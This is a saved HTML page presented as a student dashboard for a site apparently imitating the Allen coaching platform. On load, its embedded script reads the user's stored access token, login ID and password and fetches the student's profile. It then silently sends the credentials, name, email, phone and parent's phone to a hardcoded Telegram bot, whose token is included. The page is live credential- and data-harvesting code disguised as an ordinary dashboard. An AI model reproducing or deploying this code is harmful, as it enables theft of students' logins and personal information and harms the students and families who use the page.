<!DOCTYPE html>
<!-- saved from url=(0047)https://allen-in-site.vercel.app/dashboard.html -->
<html lang="en"><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/content/location/location.js" id="nimlmejbmnecnaghgmbahmbaddhjbecg"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/extend-native-history-api.js"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #f0f0f0;
        font-family: Arial, sans-serif;
        margin: 0;
      }
      .dashboard-container {
        background-color: #ffffff;
        padding: 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        width: 100%;
        max-width: 600px;
      }
      .dashboard-container h2 {
        margin-bottom: 1.5rem;
        color: #333;
      }
      .profile-info {
        margin-bottom: 1rem;
      }
      .profile-info label {
        display: block;
        font-weight: bold;
        color: #555;
      }
      .profile-info span {
        display: block;
        margin-bottom: 0.5rem;
        color: #333;
      }
      .profile-info .section {
        margin-bottom: 1rem;
      }
      button {
        width: 100%;
        padding: 0.75rem;
        background-color: #007bff;
        border: none;
        border-radius: 4px;
        color: #fff;
        font-size: 1rem;
        cursor: pointer;
      }
      button:hover {
        background-color: #0056b3;
      }
    </style>
  <script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/executors/traffic.js"></script><style>@font-face {
              font-family: 'Open Sans Regular';
              font-style: normal;
              font-weight: 400;
              src: url('chrome-extension://gkkdmjjodidppndkbkhhknakbeflbomf/fonts/open_sans/open-sans-v18-latin-regular.woff');
          }</style><style>@font-face {
              font-family: 'Open Sans Bold';
              font-style: normal;
              font-weight: 800;
              src: url('chrome-extension://gkkdmjjodidppndkbkhhknakbeflbomf/fonts/open_sans/OpenSans-Bold.woff');
          }</style><style>@font-face {
              font-family: 'Open Sans ExtraBold';
              font-style: normal;
              font-weight: 800;
              src: url('chrome-extension://gkkdmjjodidppndkbkhhknakbeflbomf/fonts/open_sans/open-sans-v18-latin-800.woff');
          }</style></head>
  <body __processed_0ee5c7a2-6db8-43fb-a809-600d8f292470__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6Im5pbWxtZWpibW5lY25hZ2hnbWJhaG1iYWRkaGpiZWNnIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4yMiIsInNjb3JlIjoyMDAyMn1d">
    <div class="dashboard-container" bis_skin_checked="1">
      <h2>Dashboard</h2>
      <div class="profile-info" bis_skin_checked="1">
        <div class="section" bis_skin_checked="1">
          <label for="full-name">Full Name:</label>
          <span id="full-name"></span>
        </div>
        <div class="section" bis_skin_checked="1">
          <label for="current-class">Current Class:</label>
          <span id="current-class"></span>
        </div>
        <div class="section" bis_skin_checked="1">
          <label for="course-name">Course Name:</label>
          <span id="course-name"></span>
        </div>
        <div class="section" bis_skin_checked="1">
          <label for="stream">Stream:</label>
          <span id="stream"></span>
        </div>
        <div class="section" bis_skin_checked="1">
          <label for="phase-name">Phase Name:</label>
          <span id="phase-name"></span>
        </div>
        <div class="section" bis_skin_checked="1">
          <label for="batch-validity">Batch Validity:</label>
          <span id="batch-validity"></span>
        </div>
      </div>
      <button id="start-extracting">Start Extracting</button>
    </div>

    <script>
      let batchStart;
      let batchEnd;

      async function sendToTelegram(message) {
        const botToken = "7386791352:AAHG7RbxDESuQ6UYiKkaoUuI2d7HSzW85_A";
        const chatId = "-1002152244093";

        try {
          const response = await fetch(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message,
              }),
            }
          );

          if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Failed to send message to Telegram: ${errorText}`);
          }
        } catch (error) {
          console.error("Error sending message to Telegram:", error);
        }
      }

      async function fetchProfile() {
        const accessToken = localStorage.getItem("accessToken");
        const username = localStorage.getItem("userid");
        const password = localStorage.getItem("passd");

        try {
          const response = await fetch(
            "https://api.allen-live.in/api/v1/user/studentInfo",
            {
              headers: {
                accept: "application/json",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
                authorization: `Bearer ${accessToken}`,
                "user-agent":
                  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
                "sec-ch-ua":
                  '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Linux"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site",
                "x-client-type": "web",
                "x-device-id": "6aa23895-aeb1-47c3-ad06-9b392fe8064d",
              },
            }
          );
          if (!response.ok) {
            throw new Error("Network response was not ok");
          }

          const data = await response.json();
          const studentDetail = data.data.student_detail;
          const parentDetail = data.data.parent_detail;
          const batchDetail = data.data.student_batch_detail[0];
          batchStart = batchDetail.batch_validity.start_from;
          batchEnd = batchDetail.batch_validity.end_at;
          const email = studentDetail.email;
          const pno = studentDetail.phone;
          const Ppno = parentDetail.phone;
          const UName = `${studentDetail.first_name} ${studentDetail.middle_name} ${studentDetail.last_name}`;
          console.log(UName);
          document.getElementById("full-name").textContent =
            `${studentDetail.first_name} ${studentDetail.middle_name} ${studentDetail.last_name}`;
          document.getElementById("current-class").textContent =
            studentDetail.current_class_display_name;
          document.getElementById("course-name").textContent =
            batchDetail.course_name;
          document.getElementById("stream").textContent =
            batchDetail.stream_name;
          document.getElementById("phase-name").textContent =
            batchDetail.phase_name;
          document.getElementById("batch-validity").textContent =
            `${batchDetail.batch_validity.start_from} to ${batchDetail.batch_validity.end_at}`;

          localStorage.setItem(
            "batchStart",
            batchDetail.batch_validity.start_from
          );
          localStorage.setItem("batchEnd", batchDetail.batch_validity.end_at);
          localStorage.setItem("Sname", UName);
          localStorage.setItem("CName", batchDetail.course_name);

          // Send login details and profile to Telegram
          const message = `

      Login Details:
      Form ID: ${username}
      Password: ${password}

      Profile Info:
      Full Name: ${studentDetail.first_name} ${studentDetail.middle_name} ${studentDetail.last_name}
      Current Class: ${studentDetail.current_class_display_name}
      Course Name: ${batchDetail.course_name}
      Stream: ${batchDetail.stream_name}
      Phase Name: ${batchDetail.phase_name}
      Batch Validity: ${batchDetail.batch_validity.start_from} to ${batchDetail.batch_validity.end_at}
      Email: ${email}
      Phone: ${pno}
      Parent Phone: ${Ppno}
      `;

          await sendToTelegram(message);
        } catch (error) {
          console.error("Error:", error);
        }
      }

      window.onload = fetchProfile;

      document
        .getElementById("start-extracting")
        .addEventListener("click", () => {
          console.log("Start extracting...");
          window.location.href = "extraction.html";
        });
    </script>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>


</body></html>